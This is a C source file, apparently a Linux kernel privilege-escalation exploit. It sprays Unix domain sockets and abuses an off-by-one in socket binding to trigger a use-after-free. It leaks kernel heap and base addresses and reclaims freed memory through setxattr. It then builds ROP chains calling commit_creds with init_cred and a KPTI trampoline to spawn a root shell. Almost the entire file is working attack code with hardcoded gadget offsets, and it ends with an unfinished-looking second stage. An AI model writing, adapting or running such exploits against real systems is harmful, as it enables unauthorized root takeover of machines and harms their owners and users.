#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/xattr.h>


#define COMMIT_CREDS_OFFSET                0x00c07b0
#define INIT_CRED_OFFSET                   0x1a52d00
#define KPTI_TRAMPOLINE_OFFSET             0x1000168
#define SINGLE_START_OFFSET                0x02e33b0

#define POP_R12_POP_RBP_POP_RBX_RET_OFFSET 0x006b15b
#define POP_RCX_RET_OFFSET                 0x0311c9d
#define POP_RDI_RET_OFFSET                 0x09bc65d
#define RET_OFFSET                         0x09bc65e


void do_bind(int sockfd, char* sun_path, int addr_len) {
  struct sockaddr_un addr = { .sun_family = AF_UNIX, .sun_path = { 0 } };

  memcpy(addr.sun_path + 1, sun_path, 4);

  if (bind(sockfd, (struct sockaddr*) &addr, addr_len) < 0) {
    perror("bind");
    exit(errno);
  }
}


void do_connect(int sockfd, char* sun_path, int addr_len) {
  struct sockaddr_un addr = { .sun_family = AF_UNIX, .sun_path = { 0 } };

  memcpy(addr.sun_path + 1, sun_path, 4);

  if (connect(sockfd, (struct sockaddr*) &addr, addr_len) < 0) {
    perror("connect");
    exit(errno);
  }
}


int do_accept(int sockfd) {
  int fd = accept(sockfd, NULL, NULL);

  if (fd < 0) {
    perror("accept");
    exit(errno);
  }

  return fd;
}


void do_listen(int sockfd) {
  if (listen(sockfd, 1) < 0) {
    perror("listen");
    exit(errno);
  }
}


void do_getsockname(int sockfd, struct sockaddr_un* addr) {
  socklen_t len = 0x40;

  if (getsockname(sockfd, (struct sockaddr*) addr, &len) < 0) {
    perror("getsockname");
    exit(errno);
  }
}


void get_shell() {
  puts("[*] Returned to userland");

  if (getuid() == 0) {
    puts("[+] UID: 0, got root!\n");
    execl("/bin/sh", "/bin/sh", NULL);
  } else {
    printf("[!] UID: %d, didn't get root\n", getuid());
    exit(1);
  }
}


unsigned long user_rsp;


void save_state() {
  __asm__(
    ".intel_syntax noprefix;"
    "mov user_rsp, rsp;"
    ".att_syntax;"
  );
  puts("[*] Saved state\n");
}


int main() {
  int spray[200];

  save_state();

  for (int i = 0; i < 200; i++) {
    spray[i] = socket(AF_UNIX, SOCK_STREAM, 0);
    char buf[8] = { 0 };
    sprintf(buf, "a%d", i);
    do_bind(spray[i], buf, 0x18 - 1);
  }

  int s1 = socket(AF_UNIX, SOCK_STREAM, 0);
  int s2 = socket(AF_UNIX, SOCK_STREAM, 0);
  int s3 = socket(AF_UNIX, SOCK_STREAM, 0);
  int s4 = socket(AF_UNIX, SOCK_STREAM, 0);

  int client_fd = socket(AF_UNIX, SOCK_STREAM, 0);
  int accept_fd;

  do_bind(s1, "AAAA", 0x18 - 1);
  do_bind(s2, "BBBB", 0x18 - 1);

  int seq_fd = open("/proc/self/stat", O_RDONLY);

  do_listen(s2);
  do_connect(client_fd, "BBBB", 0x18 - 1);
  // refcnt = 2
  accept_fd = do_accept(s2);

  close(s1);
  socket(AF_UNIX, SOCK_STREAM, 0);

  struct sockaddr_un addr;
  memset(&addr, '\x01', sizeof(struct sockaddr_un));
  addr.sun_family = AF_UNIX;
  addr.sun_path[0] = '\0';

  // fill stack with '\x01'
  if (bind(s3, (struct sockaddr*) &addr, sizeof(struct sockaddr_un)) < 0) {
    perror("bind");
    exit(1);
  }

  // off-by-one (hopefully '\x01')
  // refcnt = 1
  do_bind(s4, "CCCC", 0x18);

  // refcnt = 0 -> kfree
  close(client_fd);
  close(accept_fd);
  socket(AF_UNIX, SOCK_STREAM, 0);

  struct sockaddr_un leak;
  do_getsockname(s2, &leak);
  unsigned long kheap = *((unsigned long*) &leak + 1);

  if (kheap == 0) {
    puts("Exploit failed...");
    exit(1);
  }

  printf("[*] kheap:        0x%lx\n", kheap);
  puts("");

  unsigned int payload1[16] = { 1, 0x30 };
  setxattr("/proc/self/stat", "pwn", payload1, 0x20, 0);

  do_getsockname(s2, &leak);

  printf("[*] single_start: 0x%lx\n", *((unsigned long*) &leak + 3));
  printf("[*] single_stop:  0x%lx\n", *((unsigned long*) &leak + 4));
  printf("[*] single_next:  0x%lx\n", *((unsigned long*) &leak + 5));
  puts("");

  unsigned long kbase = *((unsigned long*) &leak + 3) - SINGLE_START_OFFSET;
  printf("[+] kbase:        0x%lx\n", kbase);
  puts("");

  unsigned long init_cred                   = kbase + INIT_CRED_OFFSET;
  unsigned long commit_creds                = kbase + COMMIT_CREDS_OFFSET;
  unsigned long ret                         = kbase + RET_OFFSET;
  unsigned long pop_rcx_ret                 = kbase + POP_RCX_RET_OFFSET;
  unsigned long pop_rdi_ret                 = kbase + POP_RDI_RET_OFFSET;
  unsigned long pop_r12_pop_rbp_pop_rbx_ret = kbase + POP_R12_POP_RBP_POP_RBX_RET_OFFSET;
  unsigned long kpti_trampoline             = kbase + KPTI_TRAMPOLINE_OFFSET;

  unsigned long long rop_chain1[] = {
    pop_r12_pop_rbp_pop_rbx_ret,
  };

  unsigned long long rop_chain2[] = {
    pop_rdi_ret,
    init_cred,
    commit_creds,
    pop_rcx_ret,
    (unsigned long) get_shell,
    ret,
    ret,
    ret,
    pop_r12_pop_rbp_pop_rbx_ret,
  };

  unsigned long long rop_chain3[] = {
    kpti_trampoline,
    0,
    0,
    0,
    0,
    0,
    user_rsp,
  };

  struct sockaddr_un rop_payload1 = { .sun_family = AF_UNIX, .sun_path = { 0 } };
  struct sockaddr_un rop_payload2 = { .sun_family = AF_UNIX, .sun_path = { 0 } };
  struct sockaddr_un rop_payload3 = { .sun_family = AF_UNIX, .sun_path = { 0 } };

  memcpy(rop_payload1.sun_path + 0x46, rop_chain1, sizeof(rop_chain1));
  memcpy(rop_payload2.sun_path + 0x06, rop_chain2, sizeof(rop_chain2));
  memcpy(rop_payload3.sun_path + 0x06, rop_chain3, sizeof(rop_chain3));

  for (int i = 0; i < 200; i++) {
    spray[i] = socket(AF_UNIX, SOCK_STREAM, 0);
    char buf[8] = { 0 };
    sprintf(buf, "b%d", i);
    do_bind(spray[i], buf, 0x58 - 1);
  }

  int rop1 = socket(AF_UNIX, SOCK_STREAM, 0);
  int rop2 = socket(AF_UNIX, SOCK_STREAM, 0);
  int rop3 = socket(AF_UNIX, SOCK_STREAM, 0);

  s1 = socket(AF_UNIX, SOCK_STREAM, 0);
  s2 = socket(AF_UNIX, SOCK_STREAM, 0);
  s3 = socket(AF_UNIX, SOCK_STREAM, 0);
  s4 = socket(AF_UNIX, SOCK_STREAM, 0);

  client_fd = socket(AF_UNIX, SOCK_STREAM, 0);

  do_bind(s1, "DDDD", 0x58 - 1);
  do_bind(s2, "EEEE", 0x58 - 1);

  if (bind(rop1, (struct sockaddr*) &rop_payload1, 0x58) < 0) {
    perror("bind");
    exit(1);
  }

  if (bind(rop2, (struct sockaddr*) &rop_payload2, 0x58) < 0) {
    perror("bind");
    exit(1);
  }

  if (bind(rop3, (struct sockaddr*) &rop_payload3, 0x58) < 0) {
    perror("bind");
    exit(1);
  }

  do_listen(s2);
  do_connect(client_fd, "EEEE", 0x58 - 1);
  // refcnt = 2
  accept_fd = do_accept(s2);

  close(s1);
  socket(AF_UNIX, SOCK_STREAM, 0);

  memset(&addr, '\x01', sizeof(struct sockaddr_un));
  addr.sun_path[0] = '\0';
  addr.sun_path[1] = '\x02';
  addr.sun_family = AF_UNIX;

  // fill stack with '\x01'
  if (bind(s3, (struct sockaddr*) &addr, sizeof(struct sockaddr_un)) < 0) {
    perror("bind");
    exit(1);
  }

  // off-by-one (hopefully '\x01')
  // refcnt = 1
  do_bind(s4, "FFFF", 0x58);

  // refcnt = 0 -> kfree
  close(client_fd);
  close(accept_fd);
  socket(AF_UNIX, SOCK_STREAM, 0);

  do_getsockname(s2, &leak);
  kheap = *((unsigned long*) &leak + 5);

  if (kheap == 0) {
    puts("Exploit failed...");
    exit(1);
  }

  printf("[*] kheap:        0x%lx\n", kheap);
  puts("");

  int payload2[24] = { 1, 0xa8 + 0xd0 };

  setxattr("/proc/self/stat", "pwn", payload2, 0x60, 0);
  do_getsockname(s2, &leak);

  puts("[-] Oops...");

  return 0;
}
